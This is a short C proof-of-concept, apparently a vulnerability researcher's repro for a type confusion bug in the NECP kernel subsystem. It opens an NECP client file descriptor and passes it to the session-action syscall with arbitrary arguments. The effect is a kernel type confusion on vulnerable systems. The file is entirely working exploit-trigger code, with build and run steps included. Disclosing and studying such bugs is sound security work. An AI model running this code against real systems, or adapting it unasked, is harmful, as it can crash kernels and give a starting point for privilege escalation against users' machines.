/**
 * Brief: Type confusion in NECP
 * Repro:
 *	1. clang NECPTypeConfusion.c -o neco_tc -Wno-deprecated-declarations
 *	2. ./neco_tc
 */

#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>

int main() {
    int necp_fd = syscall(SYS_necp_open, 0);
    if (necp_fd < 0) {
        printf("[-] Create NECP client failed!\n");
        return 0;
    }
    printf("[*] NECP client = %d\n", necp_fd);
    syscall(SYS_necp_session_action, necp_fd, 1, 0x1234, 0x5678);
    return 0;
}
